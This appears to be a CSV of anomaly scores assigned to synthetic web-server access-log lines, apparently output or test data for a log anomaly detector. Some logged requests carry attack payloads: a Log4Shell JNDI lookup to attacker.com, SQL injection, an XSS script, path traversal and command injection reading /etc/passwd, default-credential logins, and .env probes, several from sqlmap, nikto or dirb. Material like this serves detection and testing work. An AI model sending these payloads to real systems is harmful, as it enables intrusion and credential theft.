score_content,score_session,score_fused,score_fused_norm,line
1.9511656761169434,,1.9511656761169434,1.9511656761169434,137.2.161.17 - - [10/Jan/2025:12:14:15 +0000] "GET /contact HTTP/1.1" 200 17728 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9399452209472656,,1.9399452209472656,1.9399452209472656,166.210.241.19 - - [10/Jan/2025:12:14:20 +0000] "GET /contact HTTP/1.1" 200 14361 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.8212940692901611,,1.8212940692901611,1.8212940692901611,14.46.204.65 - - [10/Jan/2025:12:14:20 +0000] "GET /dashboard HTTP/1.1" 200 2500 "-" "python-requests/2.31.0"
2.013718605041504,,2.013718605041504,2.013718605041504,162.104.111.81 - - [10/Jan/2025:12:14:24 +0000] "GET /login HTTP/1.1" 200 14882 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9555319547653198,,1.9555319547653198,1.9555319547653198,194.191.150.12 - - [10/Jan/2025:12:14:29 +0000] "GET /admin HTTP/1.1" 201 2172 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.590024948120117,,23.590024948120117,23.590024948120117,196.238.113.98 - - [10/Jan/2025:12:14:33 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 9324 "-" "dirb/2.22"
23.60444450378418,,23.60444450378418,23.60444450378418,204.205.218.140 - - [10/Jan/2025:12:14:36 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12912 "https://www.google.com/" "curl/7.68.0"
30113.638671875,,30113.638671875,30113.638671875,142.224.143.37 - - [10/Jan/2025:12:14:38 +0000] "GET /profile HTTP/1.1" 429 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.54645347595215,,23.54645347595215,23.54645347595215,79.54.192.190 - - [10/Jan/2025:12:14:38 +0000] "GET /search?q=laptop HTTP/1.1" 200 2889 "https://example.com/" "sqlmap/1.5.10#stable"
0.21726861596107483,,0.21726861596107483,0.21726861596107483,158.214.65.50 - - [10/Jan/2025:12:14:39 +0000] "GET /assets/app.css HTTP/1.1" 200 7334 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30110.818359375,,30110.818359375,30110.818359375,119.166.141.19 - - [10/Jan/2025:12:14:44 +0000] "GET /index.html HTTP/1.1" 401 1124 "-" "curl/7.68.0"
30135.98828125,,30135.98828125,30135.98828125,33.172.168.61 - - [10/Jan/2025:12:14:46 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 429 731 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.47288703918457,,23.47288703918457,23.47288703918457,85.158.169.79 - - [10/Jan/2025:12:14:50 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 14866 "https://twitter.com/" "curl/7.68.0"
30113.375,,30113.375,30113.375,2.81.64.202 - - [10/Jan/2025:12:14:54 +0000] "GET /dashboard HTTP/1.1" 429 345 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.1498863697052,,3.1498863697052,3.1498863697052,225.123.119.115 - - [10/Jan/2025:12:14:56 +0000] "GET /assets/app.css HTTP/1.1" 301 10964 "https://example.com/" "curl/7.68.0"
0.21193958818912506,,0.21193958818912506,0.21193958818912506,216.72.220.212 - - [10/Jan/2025:12:14:59 +0000] "GET /assets/app.js HTTP/1.1" 204 2786 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.903472423553467,,4.903472423553467,4.903472423553467,218.130.162.8 - - [10/Jan/2025:12:15:00 +0000] "GET /about HTTP/1.1" 302 710 "https://twitter.com/" "python-requests/2.31.0"
30112.125,,30112.125,30112.125,67.140.229.139 - - [10/Jan/2025:12:15:03 +0000] "GET /api/products HTTP/1.1" 403 1129 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
1.982426404953003,,1.982426404953003,1.982426404953003,131.24.102.94 - - [10/Jan/2025:12:15:05 +0000] "GET /logout HTTP/1.1" 200 16520 "-" "python-requests/2.31.0"
3.1639907360076904,,3.1639907360076904,3.1639907360076904,115.41.46.145 - - [10/Jan/2025:12:15:10 +0000] "GET /assets/app.js HTTP/1.1" 302 4699 "https://www.google.com/" "python-requests/2.31.0"
1.9458365440368652,,1.9458365440368652,1.9458365440368652,60.17.68.95 - - [10/Jan/2025:12:15:15 +0000] "GET /profile HTTP/1.1" 200 16079 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9421693086624146,,1.9421693086624146,1.9421693086624146,226.12.11.252 - - [10/Jan/2025:12:15:20 +0000] "GET /profile HTTP/1.1" 200 14997 "https://example.com/" "sqlmap/1.5.10#stable"
30112.162109375,,30112.162109375,30112.162109375,149.140.146.45 - - [10/Jan/2025:12:15:20 +0000] "GET /login HTTP/1.1" 400 539 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
2.004822015762329,,2.004822015762329,2.004822015762329,250.233.58.133 - - [10/Jan/2025:12:15:22 +0000] "GET /about HTTP/1.1" 200 12431 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30134.595703125,,30134.595703125,30134.595703125,129.226.36.113 - - [10/Jan/2025:12:15:24 +0000] "GET /search?q=headphones HTTP/1.1" 403 13 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9775439500808716,,1.9775439500808716,1.9775439500808716,41.93.155.184 - - [10/Jan/2025:12:15:24 +0000] "GET /login HTTP/1.1" 200 6224 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9448679685592651,,1.9448679685592651,1.9448679685592651,123.54.152.42 - - [10/Jan/2025:12:15:27 +0000] "GET /contact HTTP/1.1" 200 15789 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.20755170285701752,,0.20755170285701752,0.20755170285701752,35.162.132.11 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.css HTTP/1.1" 200 5379 "https://www.google.com/" "python-requests/2.31.0"
0.26583388447761536,,0.26583388447761536,0.26583388447761536,154.249.145.164 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.js HTTP/1.1" 200 13385 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30134.244140625,,30134.244140625,30134.244140625,57.213.106.154 - - [10/Jan/2025:12:15:27 +0000] "GET /search?q=headphones HTTP/1.1" 401 349 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0005228519439697,,2.0005228519439697,2.0005228519439697,237.117.153.152 - - [10/Jan/2025:12:15:28 +0000] "GET /login HTTP/1.1" 200 11328 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9495816230773926,,1.9495816230773926,1.9495816230773926,221.233.130.176 - - [10/Jan/2025:12:15:31 +0000] "GET /contact HTTP/1.1" 200 17228 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30134.794921875,,30134.794921875,30134.794921875,10.225.201.137 - - [10/Jan/2025:12:15:35 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 403 1228 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.4375,,30112.4375,30112.4375,167.111.134.108 - - [10/Jan/2025:12:15:38 +0000] "GET / HTTP/1.1" 403 1389 "-" "curl/7.68.0"
30134.38671875,,30134.38671875,30134.38671875,203.197.98.90 - - [10/Jan/2025:12:15:43 +0000] "GET /api/product?id=123 HTTP/1.1" 404 987 "https://twitter.com/" "python-requests/2.31.0"
1.984840750694275,,1.984840750694275,1.984840750694275,233.220.22.73 - - [10/Jan/2025:12:15:43 +0000] "GET /login HTTP/1.1" 200 7718 "https://twitter.com/" "python-requests/2.31.0"
5.133600234985352,,5.133600234985352,5.133600234985352,148.134.31.134 - - [10/Jan/2025:12:15:46 +0000] "GET / HTTP/1.1" 302 333 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8265621662139893,,1.8265621662139893,1.8265621662139893,40.110.167.150 - - [10/Jan/2025:12:15:51 +0000] "GET /dashboard HTTP/1.1" 200 3592 "https://example.com/" "curl/7.68.0"
1.9354573488235474,,1.9354573488235474,1.9354573488235474,194.53.106.142 - - [10/Jan/2025:12:15:55 +0000] "GET /profile HTTP/1.1" 200 13123 "https://news.ycombinator.com/" "python-requests/2.31.0"
23.512256622314453,,23.512256622314453,23.512256622314453,148.89.199.181 - - [10/Jan/2025:12:15:56 +0000] "GET /search?q=headphones HTTP/1.1" 200 10148 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
23.4416561126709,,23.4416561126709,23.4416561126709,26.55.131.103 - - [10/Jan/2025:12:16:01 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 5401 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.33127090334892273,,0.33127090334892273,0.33127090334892273,206.24.211.38 - - [10/Jan/2025:12:16:05 +0000] "GET /index.html HTTP/1.1" 200 273 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
23.78168296813965,,23.78168296813965,23.78168296813965,156.10.186.99 - - [10/Jan/2025:12:16:08 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2722 "https://twitter.com/" "dirb/2.22"
30112.123046875,,30112.123046875,30112.123046875,164.127.113.3 - - [10/Jan/2025:12:16:13 +0000] "GET /index.html HTTP/1.1" 429 358 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.55357551574707,,23.55357551574707,23.55357551574707,93.62.168.1 - - [10/Jan/2025:12:16:15 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1281 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.855329990386963,,4.855329990386963,4.855329990386963,151.52.133.4 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 301 13385 "-" "sqlmap/1.5.10#stable"
1.919437289237976,,1.919437289237976,1.919437289237976,58.156.247.50 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 200 9160 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.07209289819002151,,0.07209289819002151,0.07209289819002151,144.19.129.76 - - [10/Jan/2025:12:16:21 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3588 "-" "sqlmap/1.5.10#stable"
4.923682689666748,,4.923682689666748,4.923682689666748,145.124.198.63 - - [10/Jan/2025:12:16:25 +0000] "GET /login HTTP/1.1" 301 12456 "https://news.ycombinator.com/" "curl/7.68.0"
2.1979830265045166,,2.1979830265045166,2.1979830265045166,18.98.163.202 - - [10/Jan/2025:12:16:30 +0000] "GET / HTTP/1.1" 200 8548 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9049835205078125,,1.9049835205078125,1.9049835205078125,180.214.68.64 - - [10/Jan/2025:12:16:32 +0000] "GET /profile HTTP/1.1" 200 418 "-" "curl/7.68.0"
1.8389182090759277,,1.8389182090759277,1.8389182090759277,122.81.91.56 - - [10/Jan/2025:12:16:35 +0000] "GET /dashboard HTTP/1.1" 200 5948 "https://example.com/" "python-requests/2.31.0"
1.82506263256073,,1.82506263256073,1.82506263256073,61.189.62.224 - - [10/Jan/2025:12:16:36 +0000] "GET /api/products HTTP/1.1" 200 6642 "https://www.google.com/" "curl/7.68.0"
30134.21875,,30134.21875,30134.21875,40.200.28.31 - - [10/Jan/2025:12:16:37 +0000] "GET /api/product?id=123 HTTP/1.1" 400 729 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30110.787109375,,30110.787109375,30110.787109375,159.81.127.230 - - [10/Jan/2025:12:16:41 +0000] "GET /wp-login.php HTTP/1.1" 401 760 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.026987314224243,,2.026987314224243,2.026987314224243,33.14.135.205 - - [10/Jan/2025:12:16:42 +0000] "GET /login HTTP/1.1" 200 18996 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.513427734375,,23.513427734375,23.513427734375,118.250.31.179 - - [10/Jan/2025:12:16:46 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 5827 "https://example.com/" "nikto/2.5.0"
23.422473907470703,,23.422473907470703,23.422473907470703,84.93.157.221 - - [10/Jan/2025:12:16:51 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 3401 "https://www.google.com/" "python-requests/2.31.0"
2.0005784034729004,,2.0005784034729004,2.0005784034729004,94.48.128.109 - - [10/Jan/2025:12:16:55 +0000] "GET /login HTTP/1.1" 200 11342 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.138671875,,30112.138671875,30112.138671875,116.47.147.34 - - [10/Jan/2025:12:17:00 +0000] "GET /profile HTTP/1.1" 401 572 "https://www.google.com/" "python-requests/2.31.0"
23.603199005126953,,23.603199005126953,23.603199005126953,51.38.205.246 - - [10/Jan/2025:12:17:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12580 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.22634176909923553,,0.22634176909923553,0.22634176909923553,229.218.162.133 - - [10/Jan/2025:12:17:03 +0000] "GET /assets/app.js HTTP/1.1" 200 4506 "https://example.com/" "python-requests/2.31.0"
0.31138354539871216,,0.31138354539871216,0.31138354539871216,16.56.209.66 - - [10/Jan/2025:12:17:06 +0000] "GET /index.html HTTP/1.1" 200 5452 "-" "Wget/1.20.3 (linux-gnu)"
2.025362730026245,,2.025362730026245,2.025362730026245,143.239.208.66 - - [10/Jan/2025:12:17:09 +0000] "GET /login HTTP/1.1" 200 18461 "-" "curl/7.68.0"
23.482328414916992,,23.482328414916992,23.482328414916992,45.251.200.73 - - [10/Jan/2025:12:17:12 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 17743 "https://example.com/" "sqlmap/1.5.10#stable"
30134.34375,,30134.34375,30134.34375,158.74.119.162 - - [10/Jan/2025:12:17:17 +0000] "GET /search?q=camera HTTP/1.1" 403 780 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8893179893493652,,1.8893179893493652,1.8893179893493652,104.218.233.19 - - [10/Jan/2025:12:17:22 +0000] "GET /dashboard HTTP/1.1" 200 18831 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.847283124923706,,1.847283124923706,1.847283124923706,155.166.102.70 - - [10/Jan/2025:12:17:24 +0000] "GET /dashboard HTTP/1.1" 204 8864 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
23.563011169433594,,23.563011169433594,23.563011169433594,219.6.33.187 - - [10/Jan/2025:12:17:29 +0000] "GET /search?q=camera HTTP/1.1" 200 6125 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0073728561401367,,2.0073728561401367,2.0073728561401367,27.25.17.240 - - [10/Jan/2025:12:17:34 +0000] "GET /about HTTP/1.1" 200 13110 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.503617525100708,,0.503617525100708,0.503617525100708,27.68.159.40 - - [10/Jan/2025:12:17:34 +0000] "GET /.env HTTP/1.1" 200 2827 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9303748607635498,,1.9303748607635498,1.9303748607635498,34.135.215.44 - - [10/Jan/2025:12:17:36 +0000] "GET /logout HTTP/1.1" 200 4242 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30112.064453125,,30112.064453125,30112.064453125,250.223.139.240 - - [10/Jan/2025:12:17:41 +0000] "GET /dashboard HTTP/1.1" 401 956 "https://twitter.com/" "curl/7.68.0"
0.12226719409227371,,0.12226719409227371,0.12226719409227371,162.192.163.225 - - [10/Jan/2025:12:17:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 15060 "https://twitter.com/" "dirb/2.22"
30112.279296875,,30112.279296875,30112.279296875,139.59.207.23 - - [10/Jan/2025:12:17:49 +0000] "GET /logout HTTP/1.1" 404 986 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.2788340449333191,,0.2788340449333191,0.2788340449333191,134.209.195.218 - - [10/Jan/2025:12:17:51 +0000] "GET /assets/app.css HTTP/1.1" 200 103 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.145936489105225,,5.145936489105225,5.145936489105225,243.194.123.77 - - [10/Jan/2025:12:17:53 +0000] "GET / HTTP/1.1" 301 16219 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.187148094177246,,2.187148094177246,2.187148094177246,106.226.144.112 - - [10/Jan/2025:12:17:55 +0000] "GET / HTTP/1.1" 200 6279 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30134.23828125,,30134.23828125,30134.23828125,68.21.109.161 - - [10/Jan/2025:12:17:56 +0000] "GET /search?q=laptop HTTP/1.1" 400 451 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0224688053131104,,2.0224688053131104,2.0224688053131104,208.69.106.49 - - [10/Jan/2025:12:18:00 +0000] "GET /login HTTP/1.1" 200 17530 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.574872970581055,,23.574872970581055,23.574872970581055,180.160.126.49 - - [10/Jan/2025:12:18:01 +0000] "GET /search?q=camera HTTP/1.1" 201 9017 "-" "curl/7.68.0"
1.9630379676818848,,1.9630379676818848,1.9630379676818848,73.69.33.184 - - [10/Jan/2025:12:18:02 +0000] "GET /admin HTTP/1.1" 200 3451 "-" "nikto/2.5.0"
2.0004231929779053,,2.0004231929779053,2.0004231929779053,108.80.202.205 - - [10/Jan/2025:12:18:03 +0000] "GET /admin HTTP/1.1" 200 11303 "https://example.com/" "nikto/2.5.0"
0.30845195055007935,,0.30845195055007935,0.30845195055007935,15.69.199.101 - - [10/Jan/2025:12:18:06 +0000] "GET /index.html HTTP/1.1" 200 4887 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30112.376953125,,30112.376953125,30112.376953125,32.250.197.183 - - [10/Jan/2025:12:18:09 +0000] "GET /login HTTP/1.1" 400 25 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2996166944503784,,0.2996166944503784,0.2996166944503784,134.171.252.54 - - [10/Jan/2025:12:18:12 +0000] "GET /index.html HTTP/1.1" 200 3178 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.8190340995788574,,1.8190340995788574,1.8190340995788574,191.240.141.134 - - [10/Jan/2025:12:18:17 +0000] "GET /dashboard HTTP/1.1" 200 1482 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8018074035644531,,1.8018074035644531,1.8018074035644531,222.171.56.250 - - [10/Jan/2025:12:18:20 +0000] "GET /api/products HTTP/1.1" 200 1806 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.2006566524505615,,2.2006566524505615,2.2006566524505615,150.31.102.203 - - [10/Jan/2025:12:18:25 +0000] "GET / HTTP/1.1" 200 9147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.41694450378418,,26.41694450378418,26.41694450378418,96.198.23.64 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=headphones HTTP/1.1" 301 5178 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.1953125,,30112.1953125,30112.1953125,16.16.92.166 - - [10/Jan/2025:12:18:25 +0000] "GET /dashboard HTTP/1.1" 404 1280 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.493181228637695,,23.493181228637695,23.493181228637695,202.166.194.89 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 18396 "https://www.google.com/" "nikto/2.5.0"
4.854625225067139,,4.854625225067139,4.854625225067139,231.11.125.181 - - [10/Jan/2025:12:18:25 +0000] "GET /profile HTTP/1.1" 302 8314 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
23.49420928955078,,23.49420928955078,23.49420928955078,140.90.83.188 - - [10/Jan/2025:12:18:27 +0000] "GET /search?q=headphones HTTP/1.1" 200 6215 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.22985674440860748,,0.22985674440860748,0.22985674440860748,116.76.210.68 - - [10/Jan/2025:12:18:31 +0000] "GET /assets/app.js HTTP/1.1" 200 5179 "https://example.com/" "python-requests/2.31.0"
3.444760322570801,,3.444760322570801,3.444760322570801,159.220.94.199 - - [10/Jan/2025:12:18:34 +0000] "GET /.env HTTP/1.1" 302 713 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.5620670914649963,,0.5620670914649963,0.5620670914649963,197.142.40.157 - - [10/Jan/2025:12:18:39 +0000] "GET /.env HTTP/1.1" 200 16403 "https://example.com/" "python-requests/2.31.0"
1.8856762647628784,,1.8856762647628784,1.8856762647628784,12.214.241.34 - - [10/Jan/2025:12:18:42 +0000] "GET /contact HTTP/1.1" 200 2284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.48560333251953,,23.48560333251953,23.48560333251953,165.215.100.169 - - [10/Jan/2025:12:18:43 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 18810 "https://twitter.com/" "nikto/2.5.0"
1.9830029010772705,,1.9830029010772705,1.9830029010772705,156.184.19.4 - - [10/Jan/2025:12:18:47 +0000] "GET /login HTTP/1.1" 200 7332 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3472050428390503,,0.3472050428390503,0.3472050428390503,211.95.204.182 - - [10/Jan/2025:12:18:47 +0000] "GET /index.html HTTP/1.1" 200 13729 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30112.220703125,,30112.220703125,30112.220703125,242.56.246.133 - - [10/Jan/2025:12:18:49 +0000] "GET /about HTTP/1.1" 400 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.607624053955078,,23.607624053955078,23.607624053955078,169.64.146.161 - - [10/Jan/2025:12:18:54 +0000] "GET /search?q=laptop HTTP/1.1" 200 17342 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.934430122375488,,4.934430122375488,4.934430122375488,92.173.118.180 - - [10/Jan/2025:12:18:59 +0000] "GET /contact HTTP/1.1" 304 18992 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.27702152729034424,,0.27702152729034424,0.27702152729034424,87.169.41.137 - - [10/Jan/2025:12:18:59 +0000] "GET /assets/app.js HTTP/1.1" 200 16637 "https://news.ycombinator.com/" "python-requests/2.31.0"
30112.03125,,30112.03125,30112.03125,196.163.111.212 - - [10/Jan/2025:12:19:01 +0000] "GET /dashboard HTTP/1.1" 400 844 "https://example.com/" "sqlmap/1.5.10#stable"
1.8698805570602417,,1.8698805570602417,1.8698805570602417,238.191.66.93 - - [10/Jan/2025:12:19:05 +0000] "GET /api/products HTTP/1.1" 200 18130 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
11042.8671875,,11042.8671875,11042.8671875,5.133.35.228 - - [10/Jan/2025:12:19:08 +0000] "GET /wp-login.php HTTP/1.1" 502 1220 "-" "python-requests/2.31.0"
30112.220703125,,30112.220703125,30112.220703125,198.211.242.177 - - [10/Jan/2025:12:19:10 +0000] "GET /api/products HTTP/1.1" 401 44 "https://twitter.com/" "curl/7.68.0"
0.2488483041524887,,0.2488483041524887,0.2488483041524887,92.40.36.68 - - [10/Jan/2025:12:19:14 +0000] "GET /assets/app.css HTTP/1.1" 200 15185 "https://twitter.com/" "curl/7.68.0"
1.970893144607544,,1.970893144607544,1.970893144607544,146.235.56.188 - - [10/Jan/2025:12:19:15 +0000] "GET /logout HTTP/1.1" 200 13200 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9228278398513794,,1.9228278398513794,1.9228278398513794,10.188.207.148 - - [10/Jan/2025:12:19:18 +0000] "GET /contact HTTP/1.1" 200 9943 "-" "Wget/1.20.3 (linux-gnu)"
1.8745875358581543,,1.8745875358581543,1.8745875358581543,107.239.223.31 - - [10/Jan/2025:12:19:18 +0000] "GET /dashboard HTTP/1.1" 200 14331 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
